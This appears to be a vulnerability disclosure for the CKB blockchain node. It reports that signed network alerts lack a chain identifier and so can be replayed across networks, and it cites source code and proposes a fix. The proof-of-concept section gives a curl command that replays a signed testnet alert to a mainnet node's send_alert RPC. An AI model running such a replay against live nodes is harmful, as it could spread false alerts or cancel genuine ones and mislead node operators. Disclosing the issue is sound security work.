### Title
`RawAlert` Signed Hash Contains No Chain/Network Identifier, Enabling Cross-Network Alert Replay — (`util/network-alert/src/verifier.rs`, `util/gen-types/src/extension/calc_hash.rs`)

---

### Summary

The `RawAlert` molecule type that is signed by the Nervos Foundation alert keys contains no chain identifier or network domain separator. Because the same four hardcoded public keys are the default `NetworkAlertConfig` for every CKB network (mainnet, testnet, preview), a valid alert signature produced for one network is cryptographically indistinguishable from a valid alert signature for any other network. An unprivileged attacker who observes a legitimately signed alert on testnet can replay it verbatim on mainnet nodes via the `send_alert` RPC or the P2P alert relay, and every node will accept it.

---

### Finding Description

**Root cause — no chain binding in the signed payload**

The `RawAlert` molecule schema contains only application-level fields:

```
table RawAlert {
    notice_until:   Uint64,
    id:             Uint32,
    cancel:         Uint32,
    priority:       Uint32,
    message:        Bytes,
    min_version:    BytesOpt,
    max_version:    BytesOpt,
}
```

There is no `chain_id`, genesis hash, or any other network-scoping field. [1](#0-0) 

`calc_alert_hash` is a plain `blake2b_256` of the raw molecule bytes — no domain separator, no prefix:

```rust
impl<'r> packed::RawAlertReader<'r> {
    pub fn calc_alert_hash(&self) -> packed::Byte32 {
        self.calc_hash()   // = blake2b_256(self.as_slice())
    }
}
``` [2](#0-1) [3](#0-2) 

The verifier signs and checks exactly this hash:

```rust
let message = Message::from_slice(alert.calc_alert_hash().as_slice())?;
// ...
verify_m_of_n(&message, self.config.signatures_threshold, &signatures, &self.pubkeys)
``` [4](#0-3) 

**Same keys across all networks**

`NetworkAlertConfig::default()` embeds a single `alert_signature.toml` that is compiled into every binary regardless of which chain spec is used:

```toml
signatures_threshold = 2
public_keys = [
  "0x03933a9b116c5017561742c37ae69acb0dca3329a52c479c85df5bb387c8ac8715",
  "0x038da23240e5a4234601902cf3db3cdfc1b3fdb2db2a54ba6204f6ca1d6ef6129a",
  "0x02adc94b64a9809019139fe70bd26aa0d787772a1ad645a4bcb1456fb3e1105f09",
  "0x0369eca725513fc94685cd0b8ccebc7be874afea38d23ccb090566aa1c50d696b1",
]
``` [5](#0-4) [6](#0-5) 

Because the keys are identical on mainnet and testnet, a signature over a given `RawAlert` is valid on both networks simultaneously.

**Exploit path**

1. The Foundation legitimately signs and broadcasts an alert on testnet (e.g., alert `20230001` for a version-specific bug). The signed `Alert` bytes are publicly observable on the testnet P2P network.
2. An unprivileged attacker copies the complete `Alert` struct (raw fields + signatures).
3. The attacker calls `send_alert` on a mainnet node's JSON-RPC endpoint, or connects as a P2P peer and sends the alert via the `AlertRelayer` protocol handler.
4. `verify_signatures` recomputes `blake2b_256(raw_alert_bytes)` — identical to the testnet hash because `RawAlert` has no chain field — and `verify_m_of_n` succeeds.
5. The mainnet node accepts the alert, stores it, and relays it to all its peers. The alert propagates across mainnet.

The `send_alert` RPC is the documented entry point: [7](#0-6) 

The P2P relay path is handled by `AlertRelayer`, which calls the same `verify_signatures` function. [8](#0-7) 

---

### Impact Explanation

- An attacker can inject any previously signed testnet alert onto mainnet (or vice versa) without possessing any private key.
- Injected alerts are displayed to all node operators via `get_blockchain_info().alerts` and propagated to every peer.
- A testnet "cancel" alert (with a `cancel` field targeting a mainnet alert ID) could suppress a legitimate mainnet emergency alert, silencing a real security warning.
- Conversely, a testnet upgrade-urgency alert replayed on mainnet causes false panic, potentially triggering unnecessary emergency upgrades by operators.
- The alert system's integrity guarantee — that only the Foundation can broadcast alerts — is broken for any network that shares the same key set.

---

### Likelihood Explanation

- The Foundation has already signed real alerts (alert `20230001` signatures are hardcoded in the test suite and publicly known).
- Any past or future testnet alert is permanently replayable on mainnet as long as `notice_until` has not expired.
- The attacker needs zero privileges: only the ability to call a standard JSON-RPC endpoint or connect as a P2P peer, both of which are open to the public.
- The precondition (a Foundation-signed testnet alert must exist) is realistic and has already been met historically.

---

### Recommendation

Include the genesis block hash (or a chain-specific constant) in the data that is hashed and signed. For example, extend `RawAlert` with a `chain_id: Byte32` field set to the genesis hash of the target network, or prepend a fixed domain-separation prefix per network before hashing:

```rust
// Proposed fix in calc_alert_hash
pub fn calc_alert_hash(&self, genesis_hash: &Byte32) -> packed::Byte32 {
    let mut hasher = new_blake2b();
    hasher.update(genesis_hash.as_slice());
    hasher.update(self.as_slice());
    let mut result = [0u8; 32];
    hasher.finalize(&mut result);
    result.into()
}
```

This ensures a signature produced for testnet is cryptographically invalid on mainnet.

---

### Proof of Concept

```
# 1. Observe a legitimately signed testnet alert (e.g., alert 20230001, already public):
signatures = [
  "8dca283684ff3cd024bd6a67efb24617e90e31dc69ac809ac6ac5e243a57b7aa...",
  "4554b37824e17ea02432507e372c869301a415bf718e0a5a33b6df75cd32fbab..."
]

# 2. Replay verbatim on a mainnet node:
curl -X POST http://<mainnet-node>:8114 \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc":"2.0","method":"send_alert","id":1,
    "params":[{
      "id":"0x1312D1","cancel":"0x0","priority":"0x14",
      "notice_until":"0x186A0",
      "message":"CKB v0.105.* have bugs. Please upgrade.",
      "min_version":"0.105.0-pre","max_version":"0.105.1",
      "signatures":["0x8dca28...","0x4554b3..."]
    }]
  }'

# Result: {"jsonrpc":"2.0","result":null,"id":1}
# The alert is accepted, stored, and relayed to all mainnet peers.
```

The `verify_signatures` call succeeds because `calc_alert_hash` produces the same 32-byte digest on mainnet as on testnet — the `RawAlert` bytes are identical and no chain context is mixed in. [4](#0-3) [2](#0-1) [5](#0-4)

### Citations

**File:** util/gen-types/schemas/extensions.mol (L445-453)
```text
table RawAlert {
    notice_until:   Uint64,
    id:             Uint32,
    cancel:         Uint32,
    priority:       Uint32,
    message:        Bytes,
    min_version:    BytesOpt,
    max_version:    BytesOpt,
}
```

**File:** util/gen-types/src/extension/calc_hash.rs (L15-22)
```rust
impl<'r, R> CalcHash for R
where
    R: Reader<'r>,
{
    fn calc_hash(&self) -> packed::Byte32 {
        blake2b_256(self.as_slice()).into()
    }
}
```

**File:** util/gen-types/src/extension/calc_hash.rs (L292-299)
```rust
impl<'r> packed::RawAlertReader<'r> {
    /// Calculates the hash for [self.as_slice()] as the alert hash.
    ///
    /// [self.as_slice()]: ../prelude/trait.Reader.html#tymethod.as_slice
    pub fn calc_alert_hash(&self) -> packed::Byte32 {
        self.calc_hash()
    }
}
```

**File:** util/network-alert/src/verifier.rs (L33-64)
```rust
    pub fn verify_signatures(&self, alert: &packed::Alert) -> Result<(), AnyError> {
        trace!("Verifying alert {:?}", alert);
        let message = Message::from_slice(alert.calc_alert_hash().as_slice())?;
        let signatures: Vec<Signature> = alert
            .signatures()
            .into_iter()
            .filter_map(
                |sig_data| match Signature::from_slice(sig_data.as_reader().raw_data()) {
                    Ok(sig) => {
                        if sig.is_valid() {
                            Some(sig)
                        } else {
                            debug!("invalid signature: {:?}", sig);
                            None
                        }
                    }
                    Err(err) => {
                        debug!("signature error: {}", err);
                        None
                    }
                },
            )
            .collect();
        verify_m_of_n(
            &message,
            self.config.signatures_threshold,
            &signatures,
            &self.pubkeys,
        )
        .map_err(|err| err.kind())?;
        Ok(())
    }
```

**File:** util/app-config/src/configs/alert_signature.toml (L1-8)
```text
# need 2 signatures to send alert
signatures_threshold = 2
public_keys = [
  "0x03933a9b116c5017561742c37ae69acb0dca3329a52c479c85df5bb387c8ac8715",
  "0x038da23240e5a4234601902cf3db3cdfc1b3fdb2db2a54ba6204f6ca1d6ef6129a",
  "0x02adc94b64a9809019139fe70bd26aa0d787772a1ad645a4bcb1456fb3e1105f09",
  "0x0369eca725513fc94685cd0b8ccebc7be874afea38d23ccb090566aa1c50d696b1",
]
```

**File:** util/app-config/src/configs/network_alert.rs (L14-18)
```rust
impl Default for Config {
    fn default() -> Self {
        let alert_config = include_bytes!("./alert_signature.toml");
        toml::from_slice(&alert_config[..]).expect("alert system config")
    }
```

**File:** rpc/src/module/alert.rs (L72-73)
```rust
    #[rpc(name = "send_alert")]
    fn send_alert(&self, alert: Alert) -> Result<()>;
```

**File:** util/network-alert/src/alert_relayer.rs (L34-46)
```rust
impl AlertRelayer {
    /// Init
    pub fn new(
        client_version: String,
        notify_controller: NotifyController,
        signature_config: NetworkAlertConfig,
    ) -> Self {
        AlertRelayer {
            notifier: Arc::new(Mutex::new(Notifier::new(client_version, notify_controller))),
            verifier: Arc::new(Verifier::new(signature_config)),
            known_lists: LruCache::new(KNOWN_LIST_SIZE),
        }
    }
```
